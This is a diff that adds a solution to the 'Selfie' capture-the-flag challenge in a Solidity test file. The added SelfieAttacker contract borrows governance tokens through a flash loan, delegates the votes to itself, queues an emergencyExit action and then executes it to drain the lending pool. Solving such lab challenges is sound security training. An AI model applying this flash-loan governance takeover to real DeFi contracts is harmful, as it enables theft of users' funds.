@@ -62,7 +62,15 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        SelfieAttacker selfieAttacker = new SelfieAttacker(
+            pool,
+            governance,
+            token,
+            recovery
+        );
+        selfieAttacker.Initiateflashloan();
+        vm.warp(block.timestamp + 2 days);
+        selfieAttacker.executeProposal();
     }
 
     /**
@@ -72,5 +80,55 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+contract SelfieAttacker is IERC3156FlashBorrower {
+    SelfiePool pool;
+    DamnValuableVotes token;
+    address recocery;
+    SimpleGovernance governance;
+    uint actionId;
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _token, address _recovery) {
+        pool = _pool;
+        token = _token;
+        recocery = _recovery;
+        governance = _governance;
+
+    }
+
+    function Initiateflashloan() external {
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1_000_001 ether, "");
+        
+    }    
+    function executeProposal() external {
+        governance.executeAction(actionId);
+        
+    }
+    function onFlashLoan(
+        address _initiator,
+        address /*_token*/,
+        uint256 _amount,
+        uint256 _fee,
+        bytes calldata /*_data*/
+    ) external returns (bytes32) {
+
+        require(msg.sender == address(pool), "SelfieAttacker: Only pool can call");
+        require(_initiator == address(this), "SelfieAttacker: Initiator is not self");
+                                                    //~ emergencyExit(address) 
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", address(recocery));
+
+        //~ Delegate votes to ourself so we can queue an action
+        token.delegate(address(this));
+
+        actionId = governance.queueAction(address(pool), 0, data);
+
+        token.approve(address(pool), _amount+_fee);
+        return CALLBACK_SUCCESS;
+        
     }
 }
